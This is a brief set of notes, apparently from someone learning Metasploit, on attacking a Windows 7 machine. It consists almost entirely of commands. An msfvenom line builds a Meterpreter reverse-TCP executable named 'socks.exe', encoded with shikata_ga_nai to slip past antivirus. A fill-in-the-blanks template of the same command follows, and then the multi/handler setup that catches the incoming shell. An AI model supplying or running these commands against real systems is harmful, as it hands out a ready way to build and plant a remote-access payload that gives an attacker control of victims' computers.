# Metasploit Basics #
OS Windows 7
- - - - 
1. Create the .exe with Venom


     msfvenom -p windows/meterpreter/reverse_tcp lhost=10.0.2.6 lport=4444 -e x86/shikata_ga_nai -f exe > /root/Desktop/socks.exe
     msfvenom -p windows/meterpreter/reverse_tcp lhost={Your IP} lport={Port number} -e x86/shikata_ga_nai -f exe > {File's path}


2. On metasploit 


     use exploit/multi/handler
     set payload windows/meterpreter/reverse_tcp

